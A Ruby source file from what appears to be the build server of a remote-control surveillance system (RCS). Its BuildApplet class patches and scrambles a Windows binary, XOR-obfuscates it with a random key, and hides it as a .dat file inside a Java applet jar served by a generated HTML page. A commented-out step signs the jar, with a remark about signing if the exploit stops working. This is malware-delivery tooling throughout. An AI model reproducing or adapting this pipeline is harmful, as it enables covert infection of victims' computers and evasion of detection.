#
# Applet creation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildApplet < Build

  def initialize
    super
    @platform = 'applet'
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"
    # override, only windows supported
    params['platforms'] = ['windows']
    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: #{e.message}"
        # trap in case of no license for a platform
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup

      outs = build.outputs

      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o + '_' + platform))
        @outputs << o + '_' + platform
      end

      build.clean
    end
  end

   def xor_encrypt(key, inputfile, outputfile)
    trace :debug, "#{inputfile} -> #{outputfile}"
    
    buf = File.open(inputfile,"rb") { |f| f.read }      
    obfuscated = []
    buf.unpack("c*").each_with_index { |c, i| obfuscated << (c ^ key[i % key.size].ord)}
    File.open(outputfile,"wb") { |f| f.write(obfuscated.pack("c*")) }    
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    # enforce that the applet cannot be build from console
    raise "Cannot build java applet directly" unless params['tni']

    @appname = params['appname'] || 'applet'    

    classname = "x.XAppletW"        
    FileUtils.cp path('x.jar'), path(@appname + '.jar')

    key = SecureRandom.random_bytes 23
    File.open(path('k'),"wb") { |f| f.write(key) }  
    File.open(path('n'),"wb") { |f| f.write(@appname + '.dat') }
    
    # obfuscate output_* with xor 0xff
    xor_encrypt(key, path('output_windows'), path(@appname + '.dat')) if File.exists? path('output_windows')
   
    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} k", {:chdir => path('')} 
    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} n", {:chdir => path('')} 

    # prepare the html file
    index_content = File.open(path('applet.html'), 'rb') {|f| f.read}
    index_content.gsub!('[:APPNAME:]', @appname)
    index_content.gsub!('[:CLASSNAME:]', classname)
    
    @outputs = [@appname + '.jar', @appname + '.dat']
    
    # write html only if tni
    if params['tni']
      File.open(path(@appname + '.html'), 'wb') {|f| f.write index_content}
      @outputs << @appname + '.html'
    end
  end

  def sign(params)   
    # remember to sign, if exploit doesn't work anymore

=begin
    trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"

    jar = path(@outputs.first)
    cert = path(@appname + '.cer')

    raise "Cannot find keystore" unless File.exist? Config.instance.cert('applet.keystore')

    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{jar} signapplet"
    raise "jarsigner failed" unless File.exist? jar

    CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -alias signapplet -file #{cert}"
    raise "keytool export failed" unless File.exist? cert

    @outputs << @appname + '.cer'
=end

  end
  
  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "wb") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
